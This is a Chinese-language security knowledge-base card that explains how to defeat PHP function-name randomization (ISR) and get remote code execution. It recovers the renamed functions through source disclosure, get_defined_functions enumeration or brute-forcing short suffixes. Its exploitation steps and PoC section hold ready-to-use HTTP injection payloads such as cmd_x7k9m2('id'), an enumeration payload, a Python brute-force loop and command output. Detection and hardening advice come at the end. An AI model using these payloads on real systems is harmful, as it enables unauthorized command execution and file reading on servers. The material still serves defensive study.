---
id: web-php-rce-isr-randomized-function-name-recovery
title: 指令集随机化防护下通过源码泄露、短标签爆破或内建函数枚举恢复随机化函数名
type: scenario
domain: web
path: web/php/rce
technique: isr-randomized-function-name-recovery
aliases:
- 拟态防御 函数随机化绕过
- ISR 随机化函数名
- system2913w
- cmd_x7k9m2
- get_defined_functions 枚举
tags:
- php
- instruction-set-randomization
- mimic-defense
- defense-bypass
- source-disclosure
- brute-force
- function-enumeration
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:41:59+08:00'
  notes: 已对照原文及图8-18核对：system 报 undefined function、源码泄露 /?read=inc%2Fcore.php 暴露 cmd_x7k9m2/read_k2p5、调用 cmd_x7k9m2('id') 返回 uid=33、短后缀 system_1234 爆破命中、get_defined_functions()['internal'] 枚举均与图8-14一致。原文表决器时序/轮换竞态实验状态码统计有误且仅本地1-10ms窗口，卡片未将其写成可靠利用，处理正确。该卡为作者自建 ISR Defense Lab，已标 medium；未在真实产品复现。PoC 未执行。
---

## 一句话结论

指令集随机化（ISR）把 `system` 等敏感函数改名为 `system2913w`/`cmd_x7k9m2` 之类随机名，使注入代码按原名调用时报 `Call to undefined function`；但运行进程里必须保留真实映射，攻击者只要通过源码泄露读到函数定义、短后缀爆破或 `get_defined_functions()` 枚举拿到新名字，仍可在注入点调用成功。

## 原理

- ISR 防御的前提是“攻击者不知道随机化后的函数名，所以注入的 `system('id')` 无法执行”。这属于靠名字保密获得的安全性，而不是权限隔离。
- 但被改名的函数在 PHP 进程里真实存在，且源码中保留函数定义。因此任何能读到源码、函数表或反射信息的能力都会直接泄露映射：
  - 源码泄露：`function cmd_x7k9m2($command)`、`function read_k2p5($file)` 这样的定义直接写明新名字。
  - 短标签爆破：随机后缀足够短（原文实验为 4 位以内）时，枚举 `system_0000`…`system_9999` 即可命中；命中项返回命令输出，未命中项走“函数不存在”的错误路径。
  - 内建枚举：`get_defined_functions()` 返回当前进程所有已定义函数（`internal` 与 `user` 两部分），`print_r` 输出即可看到随机化后的名字，按前缀过滤即可。
- 一旦拿到真实函数名，注入点不再需要调用原名，直接 `cmd_x7k9m2('id')` 即可执行；后续还可继续调用随机化的文件读取函数。
- 本质问题是防御把“不可预测的名字”当作安全边界，而运行时名字对具备读文件/枚举/反射能力的攻击者是可观测的。

## 触发条件

- 应用采用 ISR/函数名随机化，同时存在可控的函数调用/代码注入点。
- 满足以下任一条件：
  - 存在源码泄露、任意文件读取或备份文件可访问；
  - 随机后缀长度很短，可在线枚举；
  - `get_defined_functions`、`print_r`、`ReflectionFunction` 等未禁用且可通过注入点调用。
- 攻击者可观察响应差异（输出、错误信息、状态码或耗时）判断命中。

## 利用步骤

1. 先按常规函数名注入，确认返回 `Call to undefined function system()`，推断存在随机化防护。
2. 寻找泄露面：源码读取/下载接口、备份文件、`?read=` 类参数；读取定义敏感函数的文件。
3. 从源码中正则提取 `function\s+([a-zA-Z0-9_]+)\s*\(`，筛出命令执行/文件读取包装函数（如 `cmd_`、`read_` 前缀）。
4. 若无源码泄露，尝试内建枚举：在注入点执行 `print_r(get_defined_functions()['internal'])`，按 `system_`、`exec_` 等前缀筛选。
5. 后缀很短时直接爆破：对 `system_` + 数字/小写字母组合逐个请求，命中项返回命令输出或状态码/耗时异常。
6. 用恢复出的真实函数名在注入点调用，执行命令或读文件。

## PoC

源码泄露恢复：

```http
GET /?read=inc%2Fcore.php HTTP/1.1
Host: target
```

响应中暴露：

```php
function cmd_x7k9m2($command) { ... proc_open ... }
function read_k2p5($file) { return file_get_contents($file); }
```

随后在注入点调用：

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

calc=cmd_x7k9m2('id')
```

原文响应：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

内建函数枚举（若未被禁用）：

```http
calc=print_r(get_defined_functions()['internal'])
```

返回数组中出现 `system_1234` 之类的名字后，直接调用：

```http
calc=system_1234('id')
```

短后缀爆破的最小思路：

```python
import requests
for i in range(10000):
    name = f"system_{i:04d}"
    r = requests.post(url, data={"calc": f"{name}('id')"})
    if "uid=" in r.text:
        print("hit:", name); break
```

## 变体与关联

- 变体：`get_defined_functions()['user']` 枚举应用自定义包装函数；`ReflectionFunction`、`phpinfo()`、未捕获异常信息也可能泄露真实函数名。
- 变体：后缀含字母时按字符集扩大爆破；后缀足够长时放弃爆破，优先找源码/备份泄露。
- 变体：函数名还会出现在错误堆栈、调试页、日志或自动补全接口中。
- 关联：[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（动态函数名拼接是绕过静态检测，本卡是绕过运行时随机化）。
- 边界：若源码不可读、函数表枚举被禁用、随机后缀足够长且定期轮换，攻击者难以在一次注入中稳定取得名字；原文实验环境为自建 ISR Defense Lab，真实产品实现可能不同。

## 检测与防御

- 检测：请求中出现 `get_defined_functions`、`print_r`、`ReflectionFunction`、`phpinfo`；对同一注入点大量重复请求且仅函数名后缀变化（爆破特征）；异常的函数名前缀枚举。
- 检测：源码/备份文件被访问；应用错误信息暴露真实函数名。
- 防御：随机化名字使用足够长的随机串（≥8 位）并定期轮换；禁止部署可读源码与备份；生产环境禁用 `get_defined_functions`、`print_r`、`ReflectionFunction`、`phpinfo` 等反射/枚举函数。
- 加固：ISR 只能作为纵深防御的一层，不能替代输入过滤与权限隔离；函数名映射应放在不可读的编译产物/扩展中；结合 RASP 对实际调用名做运行时校验，而不是只依赖名字保密。
